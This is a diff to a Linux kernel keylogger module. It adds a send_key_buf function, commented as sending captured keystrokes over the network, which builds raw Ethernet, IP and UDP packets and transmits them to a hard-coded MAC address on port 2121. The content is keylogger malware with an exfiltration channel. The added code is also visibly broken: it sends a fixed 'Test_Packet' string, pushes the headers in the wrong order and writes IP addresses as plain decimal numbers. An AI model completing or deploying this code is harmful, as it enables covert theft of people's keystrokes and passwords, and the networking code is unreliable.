@@ -65,6 +65,54 @@ void print_key(void) {
         printk(KERN_INFO ".(0x%x)\n", c);
 }
 
+/* send key_buf over the network */
+static int send_key_buf(void){
+    unsigned char *Data = "Test_Packet";
+    int i = strlen(Data);
+    struct sk_buff* skb = alloc_skb(ETH_HLEN + IP_Header_RM + UDP_Header_RM + i, GFP_ATOMIC);
+    struct net_device *Device;
+    uint16_t proto;
+    struct iphdr* iph;
+    struct ethhdr* eth;
+    struct udphdr* uh;
+    uint8_t Mac_Addr[ETH_ALEN] = {0x38, 0xd5, 0x47, 0xa1, 0x07, 0x41};
+
+    skb_reserve(skb, ETH_HLEN + IP_Header_RM + UDP_Header_RM + i);
+    Data = skb_put(skb, i);
+    iph = (struct iphdr*)skb_push(skb, IP_Header_RM);
+    uh = (struct udphdr*)skb_push(skb, UDP_Header_RM);
+    eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));
+
+    Device = dev_get_by_name(&init_net,"enp0s3");
+    if (Device == NULL) {
+        printk(KERN_INFO "init_Module: no such device enp0s3\n");
+        return 1;
+    }
+    proto = ETH_P_IP;
+    uh->len = htons(i); 
+    uh->source = htons(2121);
+    uh->dest = htons(2121);
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len= htons(IP_Header_RM + i); 
+    iph->frag_off = 0; 
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_UDP;
+    iph->check = 0; 
+    iph->saddr = 19216805;
+    iph->daddr = 19216804;
+    skb->protocol = eth->h_proto = htons(proto);
+    skb->no_fcs = 1;
+    memcpy(eth->h_source, Device->dev_addr, ETH_ALEN);
+    memcpy(eth->h_dest, Mac_Addr, ETH_ALEN);
+
+
+    skb->pkt_type = PACKET_OUTGOING;
+    dev_queue_xmit(skb);
+    return 0;
+}
 
 /* notifier callback function */
 int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
